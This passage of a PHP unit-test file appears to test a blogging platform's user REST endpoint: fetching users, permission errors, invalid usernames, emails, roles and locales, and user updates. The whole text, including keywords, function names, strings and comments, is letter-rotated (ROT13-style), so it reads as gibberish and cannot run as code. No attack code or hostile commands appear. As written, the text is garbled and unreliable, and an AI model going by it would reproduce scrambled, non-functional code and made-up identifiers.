		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrz_choyvfurq_nhgube_cbfg() {
		$nhgube_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $nhgube_vq,
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', $nhgube_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_hfre_erfcbafr( $erfcbafr, 'rzorq' );
	}

	choyvp shapgvba grfg_trg_vgrz_choyvfurq_nhgube_cntrf() {
		$nhgube_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', $nhgube_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $nhgube_vq,
				'cbfg_glcr'   => 'cntr',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_hfre_erfcbafr( $erfcbafr, 'rzorq' );
	}

	choyvp shapgvba grfg_trg_hfre_jvgu_rqvg_pbagrkg() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_hfre_erfcbafr( $erfcbafr, 'rqvg' );
	}

	choyvp shapgvba grfg_trg_vgrz_choyvfurq_nhgube_jebat_pbagrkg() {
		$nhgube_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $nhgube_vq,
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', $nhgube_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pheerag_hfre( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref/zr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlAbgUnfXrl( 'Ybpngvba', $urnqref );

		vs ( 'URNQ' === $zrgubq ) {
			// URNQ erfcbafrf bayl pbagnva urnqref. Onvy.
			erghea ahyy;
		}
		$guvf->purpx_trg_hfre_erfcbafr( $erfcbafr, 'ivrj' );
		$yvaxf = $erfcbafr->trg_yvaxf();
		$guvf->nffregFnzr( erfg_hey( 'jc/i2/hfref/' . frys::$hfre ), $yvaxf['frys'][0]['uers'] );
	}

	choyvp shapgvba grfg_trg_pheerag_hfre_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref/zr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_abg_ybttrq_va', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_perngr_vgrz() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$cnenzf = neenl(
			'hfreanzr'    => 'grfghfre',
			'cnffjbeq'    => 'grfgcnffjbeq',
			'rznvy'       => 'grfg@rknzcyr.pbz',
			'anzr'        => 'Grfg Hfre',
			'avpxanzr'    => 'grfghfre',
			'fyht'        => 'grfg-hfre',
			'ebyrf'       => neenl( 'rqvgbe' ),
			'qrfpevcgvba' => 'Arj NCV Hfre',
			'hey'         => 'uggc://rknzcyr.pbz',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz', $qngn['hey'] );
		$guvf->nffregFnzr( neenl( 'rqvgbe' ), $qngn['ebyrf'] );
		$guvf->purpx_nqq_rqvg_hfre_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_hfreanzr() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$cnenzf = neenl(
			'hfreanzr'    => '¯\_(ツ)_/¯',
			'cnffjbeq'    => 'grfgcnffjbeq',
			'rznvy'       => 'grfg@rknzcyr.pbz',
			'anzr'        => 'Grfg Hfre',
			'avpxanzr'    => 'grfghfre',
			'fyht'        => 'grfg-hfre',
			'ebyrf'       => neenl( 'rqvgbe' ),
			'qrfpevcgvba' => 'Arj NCV Hfre',
			'hey'         => 'uggc://rknzcyr.pbz',
		);

		// Hfreanzr ehyrf ner qvssrerag (zber fgevpg) sbe zhygvfvgr; frr `jczh_inyvqngr_hfre_fvtahc`.
		vs ( vf_zhygvfvgr() ) {
			$cnenzf['hfreanzr'] = 'ab-qnfurf-nyybjrq';
		}

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		$qngn = $erfcbafr->trg_qngn();

		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregVfNeenl( $qngn['nqqvgvbany_reebef'] );
			$guvf->nffregPbhag( 1, $qngn['nqqvgvbany_reebef'] );
			$reebe = $qngn['nqqvgvbany_reebef'][0];
			$guvf->nffregFnzr( 'hfre_anzr', $reebe['pbqr'] );
			$guvf->nffregFnzr( 'Hfreanzrf pna bayl pbagnva ybjrepnfr yrggref (n-m) naq ahzoref.', $reebe['zrffntr'] );
		} ryfr {
			$guvf->nffregVfNeenl( $qngn['qngn']['cnenzf'] );
			$reebef = $qngn['qngn']['cnenzf'];
			$guvf->nffregVfFgevat( $reebef['hfreanzr'] );
			$guvf->nffregFnzr( 'Guvf hfreanzr vf vainyvq orpnhfr vg hfrf vyyrtny punenpgref. Cyrnfr ragre n inyvq hfreanzr.', $reebef['hfreanzr'] );
		}
	}

	choyvp shapgvba trg_vyyrtny_hfre_ybtvaf() {
		erghea neenl( 'abcr' );
	}

	choyvp shapgvba grfg_perngr_vgrz_vyyrtny_hfreanzr() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		nqq_svygre( 'vyyrtny_hfre_ybtvaf', neenl( $guvf, 'trg_vyyrtny_hfre_ybtvaf' ) );

		$cnenzf = neenl(
			'hfreanzr'    => 'abcr',
			'cnffjbeq'    => 'grfgcnffjbeq',
			'rznvy'       => 'grfg@rknzcyr.pbz',
			'anzr'        => 'Grfg Hfre',
			'avpxanzr'    => 'grfghfre',
			'fyht'        => 'grfg-hfre',
			'ebyrf'       => neenl( 'rqvgbe' ),
			'qrfpevcgvba' => 'Arj NCV Hfre',
			'hey'         => 'uggc://rknzcyr.pbz',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		erzbir_svygre( 'vyyrtny_hfre_ybtvaf', neenl( $guvf, 'trg_vyyrtny_hfre_ybtvaf' ) );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregVfNeenl( $qngn['qngn']['cnenzf'] );
		$reebef = $qngn['qngn']['cnenzf'];
		$guvf->nffregVfFgevat( $reebef['hfreanzr'] );
		$guvf->nffregFnzr( 'Fbeel, gung hfreanzr vf abg nyybjrq.', $reebef['hfreanzr'] );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_perngr_arj_argjbex_hfre_ba_fvgr_qbrf_abg_nqq_hfre_gb_fho_fvgr() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$cnenzf = neenl(
			'hfreanzr' => 'grfghfre123',
			'cnffjbeq' => 'grfgcnffjbeq',
			'rznvy'    => 'grfg@rknzcyr.pbz',
			'anzr'     => 'Grfg Hfre 123',
			'ebyrf'    => neenl( 'rqvgbe' ),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$hfre_vq  = $qngn['vq'];

		$hfre_vf_zrzore = vf_hfre_zrzore_bs_oybt( $hfre_vq, frys::$fvgr );

		jczh_qryrgr_hfre( $hfre_vq );

		$guvf->nffregSnyfr( $hfre_vf_zrzore );
	}

	/**
	 * @gvpxrg 41101
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_perngr_arj_argjbex_hfre_jvgu_nqq_hfre_gb_oybt_snvyher() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$cnenzf = neenl(
			'hfreanzr' => 'grfghfre123',
			'cnffjbeq' => 'grfgcnffjbeq',
			'rznvy'    => 'grfg@rknzcyr.pbz',
			'anzr'     => 'Grfg Hfre 123',
			'ebyrf'    => neenl( 'rqvgbe' ),
		);

		nqq_svygre( 'pna_nqq_hfre_gb_oybt', '__erghea_snyfr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'hfre_pnaabg_or_nqqrq', $erfcbafr );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_perngr_arj_argjbex_hfre_ba_fho_fvgr_nqqf_hfre_gb_fvgr() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$cnenzf = neenl(
			'hfreanzr' => 'grfghfre123',
			'cnffjbeq' => 'grfgcnffjbeq',
			'rznvy'    => 'grfg@rknzcyr.pbz',
			'anzr'     => 'Grfg Hfre 123',
			'ebyrf'    => neenl( 'rqvgbe' ),
		);

		fjvgpu_gb_oybt( frys::$fvgr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$hfre_vq  = $qngn['vq'];

		erfgber_pheerag_oybt();

		$hfre_vf_zrzore = vf_hfre_zrzore_bs_oybt( $hfre_vq, frys::$fvgr );

		jczh_qryrgr_hfre( $hfre_vq );

		$guvf->nffregGehr( $hfre_vf_zrzore );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_perngr_rkvfgvat_argjbex_hfre_ba_fho_fvgr_unf_reebe() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$cnenzf = neenl(
			'hfreanzr' => 'grfghfre123',
			'cnffjbeq' => 'grfgcnffjbeq',
			'rznvy'    => 'grfg@rknzcyr.pbz',
			'anzr'     => 'Grfg Hfre 123',
			'ebyrf'    => neenl( 'rqvgbe' ),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$hfre_vq  = $qngn['vq'];

		fjvgpu_gb_oybt( frys::$fvgr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$fjvgpurq_erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		erfgber_pheerag_oybt();

		jczh_qryrgr_hfre( $hfre_vq );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $fjvgpurq_erfcbafr, 400 );
		$qngn = $fjvgpurq_erfcbafr->trg_qngn();
		$guvf->nffregVfNeenl( $qngn['nqqvgvbany_reebef'] );
		$guvf->nffregPbhag( 2, $qngn['nqqvgvbany_reebef'] );
		$reebef = $qngn['nqqvgvbany_reebef'];
		sbernpu ( $reebef nf $reebe ) {
			// Purpx gur pbqr zngpurf bar jr xabj.
			$guvf->nffregPbagnvaf( $reebe['pbqr'], neenl( 'hfre_anzr', 'hfre_rznvy' ) );
			vs ( 'hfre_anzr' === $reebe['pbqr'] ) {
				$guvf->nffregFnzr( 'Fbeel, gung hfreanzr nyernql rkvfgf!', $reebe['zrffntr'] );
			} ryfr {
				$rkcrpgrq = '<fgebat>Reebe:</fgebat> Guvf rznvy nqqerff vf nyernql ertvfgrerq. ' .
							'<n uers=\"uggc://erfg.jbeqcerff.bet/jc-ybtva.cuc\">Ybt va</n> jvgu ' .
							'guvf nqqerff be pubbfr nabgure bar.';
				$guvf->nffregFnzr( $rkcrpgrq, $reebe['zrffntr'] );
			}
		}
	}

	choyvp shapgvba grfg_wfba_perngr_hfre() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$cnenzf = neenl(
			'hfreanzr' => 'grfgwfbahfre',
			'cnffjbeq' => 'grfgwfbacnffjbeq',
			'rznvy'    => 'grfgwfba@rknzcyr.pbz',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_nqq_rqvg_hfre_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_perngr_hfre_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$cnenzf = neenl(
			'hfreanzr' => 'ubzrefvzcfba',
			'cnffjbeq' => 'fghcvqfrklsynaqref',
			'rznvy'    => 'puhaxlybire53@nby.pbz',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_perngr_hfre', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_hfre_vainyvq_vq() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$cnenzf = neenl(
			'vq'       => '156',
			'hfreanzr' => 'yvfnfvzcfba',
			'cnffjbeq' => 'QnivqUnffryubss',
			'rznvy'    => 'fznegtvey63_@lnubb.pbz',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_rkvfgf', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_hfre_vainyvq_rznvy() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$cnenzf = neenl(
			'hfreanzr' => 'yvfnfvzcfba',
			'cnffjbeq' => 'QnivqUnffryubss',
			'rznvy'    => 'fbzrguvat',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_hfre_vainyvq_ebyr() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$cnenzf = neenl(
			'hfreanzr' => 'znttvrfvzcfba',
			'cnffjbeq' => 'v_fubg_zeoheaf',
			'rznvy'    => 'cnpxvaturng@rknzcyr.pbz',
			'ebyrf'    => neenl( 'onol' ),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_ebyr', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_rznvy' => 'grfg@rknzcyr.pbz',
				'hfre_cnff'  => 'fwsyfsyf',
				'hfre_ybtva' => 'grfg_hcqngr',
				'svefg_anzr' => 'Byq Anzr',
				'hfre_hey'   => 'uggc://nccyr.pbz',
				'ybpnyr'     => 'ra_HF',
			)
		);

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$hfreqngn  = trg_hfreqngn( $hfre_vq );
		$cj_orsber = $hfreqngn->hfre_cnff;

		$_CBFG['rznvy']      = $hfreqngn->hfre_rznvy;
		$_CBFG['hfreanzr']   = $hfreqngn->hfre_ybtva;
		$_CBFG['svefg_anzr'] = 'Arj Anzr';
		$_CBFG['hey']        = 'uggc://tbbtyr.pbz';
		$_CBFG['ybpnyr']     = 'qr_QR';

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $_CBFG );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_nqq_rqvg_hfre_erfcbafr( $erfcbafr, gehr );

		// Purpx gung gur anzr unf orra hcqngrq pbeerpgyl.
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Arj Anzr', $arj_qngn['svefg_anzr'] );
		$hfre = trg_hfreqngn( $hfre_vq );
		$guvf->nffregFnzr( 'Arj Anzr', $hfre->svefg_anzr );

		$guvf->nffregFnzr( 'uggc://tbbtyr.pbz', $arj_qngn['hey'] );
		$guvf->nffregFnzr( 'uggc://tbbtyr.pbz', $hfre->hfre_hey );
		$guvf->nffregFnzr( 'qr_QR', $hfre->ybpnyr );

		// Purpx gung jr unira'g vanqiregragyl punatrq gur hfre'f cnffjbeq,
		// nf cre uggcf://pber.genp.jbeqcerff.bet/gvpxrg/21429
		$guvf->nffregFnzr( $cj_orsber, $hfre->hfre_cnff );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_ab_punatr() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$hfre = trg_hfreqngn( frys::$rqvgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erdhrfg->frg_cnenz( 'fyht', $hfre->hfre_avpranzr );

		// Eha gjvpr gb znxr fher gung gur hcqngr fgvyy fhpprrqf
		// rira vs ab QO ebjf ner hcqngrq.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_rkvfgvat_rznvy() {
		$hfre1 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre',
				'hfre_rznvy' => 'grfgwfba@rknzcyr.pbz',
			)
		);
		$hfre2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre2',
				'hfre_rznvy' => 'grfgwfba2@rknzcyr.pbz',
			)
		);

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/' . $hfre2 );
		$erdhrfg->frg_cnenz( 'rznvy', 'grfgwfba@rknzcyr.pbz' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 'erfg_hfre_vainyvq_rznvy', $erfcbafr->nf_reebe()->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 44672
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_rkvfgvat_rznvy_pnfr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$hfre = trg_hfreqngn( frys::$rqvgbe );

		$hcqngrq_rznvy_jvgu_pnfr_punatr = hpjbeqf( $hfre->hfre_rznvy );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erdhrfg->frg_cnenz( 'rznvy', $hcqngrq_rznvy_jvgu_pnfr_punatr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( $hcqngrq_rznvy_jvgu_pnfr_punatr, $qngn['rznvy'] );
	}

	/**
	 * @gvpxrg 44672
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_rkvfgvat_rznvy_pnfr_abg_bja() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$hfre       = trg_hfreqngn( frys::$rqvgbe );
		$fhofpevore = trg_hfreqngn( frys::$fhofpevore );

		$hcqngrq_rznvy_jvgu_pnfr_punatr = hpjbeqf( $fhofpevore->hfre_rznvy );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erdhrfg->frg_cnenz( 'rznvy', $hcqngrq_rznvy_jvgu_pnfr_punatr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'erfg_hfre_vainyvq_rznvy', $qngn['pbqr'] );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_ybpnyr() {
		$hfre1 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre',
				'hfre_rznvy' => 'grfgwfba@rknzcyr.pbz',
			)
		);

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/' . $hfre1 );
		$erdhrfg->frg_cnenz( 'ybpnyr', 'xyvatba' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 'erfg_vainyvq_cnenz', $erfcbafr->nf_reebe()->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_ra_HF_ybpnyr() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre',
				'hfre_rznvy' => 'grfgwfba@rknzcyr.pbz',
			)
		);

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/' . $hfre_vq );
		$erdhrfg->frg_cnenz( 'ybpnyr', 'ra_HF' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_nqq_rqvg_hfre_erfcbafr( $erfcbafr, gehr );

		$hfre = trg_hfreqngn( $hfre_vq );
		$guvf->nffregFnzr( 'ra_HF', $hfre->ybpnyr );
	}

	/**
	 * @gvpxrg 38632
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_rzcgl_ybpnyr() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre',
				'hfre_rznvy' => 'grfgwfba@rknzcyr.pbz',
				'ybpnyr'     => 'qr_QR',
			)
		);

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/' . $hfre_vq );
		$erdhrfg->frg_cnenz( 'ybpnyr', '' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_nqq_rqvg_hfre_erfcbafr( $erfcbafr, gehr );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( trg_ybpnyr(), $qngn['ybpnyr'] );
		$hfre = trg_hfreqngn( $hfre_vq );
		$guvf->nffregFnzr( '', $hfre->ybpnyr );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_hfreanzr_nggrzcg() {
		$hfre1 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre',
				'hfre_rznvy' => 'grfgwfba@rknzcyr.pbz',
			)
		);
		$hfre2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre2',
				'hfre_rznvy' => 'grfgwfba2@rknzcyr.pbz',
			)
		);

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/' . $hfre2 );
		$erdhrfg->frg_cnenz( 'hfreanzr', 'grfg_wfba_hfre' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr->nf_reebe() );
